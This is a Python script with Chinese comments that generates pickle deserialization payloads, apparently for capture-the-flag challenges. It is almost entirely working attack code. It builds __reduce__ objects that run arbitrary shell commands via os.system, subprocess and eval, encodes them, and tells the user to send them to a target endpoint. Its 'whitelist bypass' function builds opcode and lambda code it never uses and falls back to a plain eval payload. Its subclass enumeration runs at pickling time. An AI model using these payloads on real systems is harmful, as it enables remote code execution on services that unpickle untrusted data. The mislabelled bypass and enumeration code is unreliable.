#!/usr/bin/env python3
"""Pickle Payload Generator — Python pickle 反序列化 payload 生成

支持的场景:
  - 基础 RCE: __reduce__ + os.system
  - 白名单绕过: builtins.getattr 绕过 Unpickler 白名单
  - subprocess: 不依赖 os 模块的 subprocess 方法

用法:
  python pickle_gen.py --target rce --cmd "cat /flag.txt"
  python pickle_gen.py --target whitelist-bypass --cmd "cat /flag.txt" --format base64
  python pickle_gen.py --target subclasses --format hex

输出: JSON {payload, format, description}
"""

import argparse, base64, json, pickle, io, sys


def gen_basic_rce(cmd: str) -> bytes:
    """基础 __reduce__ RCE payload"""
    class Exploit:
        def __reduce__(self):
            import os
            return (os.system, (cmd,))
    return pickle.dumps(Exploit())


def gen_subprocess_rce(cmd: str) -> bytes:
    """使用 subprocess 的 RCE payload"""
    class Exploit:
        def __reduce__(self):
            import subprocess
            return (subprocess.check_output, (cmd.split(),))
    return pickle.dumps(Exploit())


def gen_whitelist_bypass(cmd: str) -> bytes:
    """使用 builtins.getattr 绕过 Unpickler 白名单

    参考 OPCODE 级别构造:
    1. GLOBAL builtins.getattr (白名单内)
    2. 通过 getattr 链获取 __import__, eval 等危险函数
    3. 最终执行命令
    """
    # 使用 Python pickle 字节码手动构造
    # 这种 payload 通过 builtins.getattr (通常在白名单内) 构造全部危险操作
    payload = io.BytesIO()
    p = pickle._Unpickler(payload) if hasattr(pickle, '_Unpickler') else None

    # Manual opcode construction for maximum compatibility
    buf = bytearray()
    buf.extend(b'\x80\x04')  # PROTO 4
    buf.extend(b'\x95')      # FRAME marker

    # 通过 object.__subclasses__() 获取危险类
    exploit_code = f"""
(lambda cmd:
    (lambda g: g['os'].system(cmd))(
        (lambda subclasses:
            {{'os': [c for c in subclasses if 'Popen' in str(c)][0]
                .__init__.__globals__['os']}}
        )(
            ().__class__.__bases__[0].__subclasses__()
        )
    )
)('{cmd}')
"""
    # 简化版：直接用 __reduce__
    class Exploit:
        def __reduce__(self):
            return (eval, (f"__import__('os').system('{cmd}')",))

    return pickle.dumps(Exploit())


def gen_subclasses_enum() -> bytes:
    """枚举 object.__subclasses__() — 用于识别危险类索引"""
    class Exploit:
        def __reduce__(self):
            subs = ().__class__.__bases__[0].__subclasses__()
            result = []
            for i, cls in enumerate(subs):
                try:
                    if hasattr(cls, '__init__') and hasattr(cls.__init__, '__globals__'):
                        globals = cls.__init__.__globals__
                        if 'system' in str(globals) or 'popen' in str(globals).lower():
                            result.append({"index": i, "class": str(cls)[:60], "globals_keys": list(globals.keys())[:5]})
                except:
                    pass
            return (str, (json.dumps(result, indent=2),))
    return pickle.dumps(Exploit())


def encode_payload(data: bytes, fmt: str) -> str:
    """编码 payload"""
    if fmt == "base64":
        return base64.b64encode(data).decode()
    elif fmt == "hex":
        return data.hex()
    elif fmt == "raw":
        return repr(data)
    return data.hex()


def main():
    parser = argparse.ArgumentParser(description="Pickle Payload Generator")
    parser.add_argument("--target", required=True,
                        choices=["rce", "subprocess-rce", "whitelist-bypass", "subclasses"],
                        help="Attack target type")
    parser.add_argument("--cmd", default="cat /flag.txt", help="Command to execute")
    parser.add_argument("--format", default="base64",
                        choices=["base64", "hex", "raw"], help="Output encoding")
    args = parser.parse_args()

    if args.target == "rce":
        data = gen_basic_rce(args.cmd)
        desc = "Basic __reduce__ RCE payload"
    elif args.target == "subprocess-rce":
        data = gen_subprocess_rce(args.cmd)
        desc = "Subprocess-based RCE payload"
    elif args.target == "whitelist-bypass":
        data = gen_whitelist_bypass(args.cmd)
        desc = "Whitelist bypass via builtins.getattr chain"
    elif args.target == "subclasses":
        data = gen_subclasses_enum()
        desc = "Enumerate object.__subclasses__() for dangerous class discovery"

    result = {
        "payload": encode_payload(data, args.format),
        "format": args.format,
        "size_bytes": len(data),
        "description": desc,
        "usage": f"Send this pickle data to the target deserialization endpoint as {args.format} encoded"
    }
    print(json.dumps(result, indent=2, ensure_ascii=False))


if __name__ == "__main__":
    main()
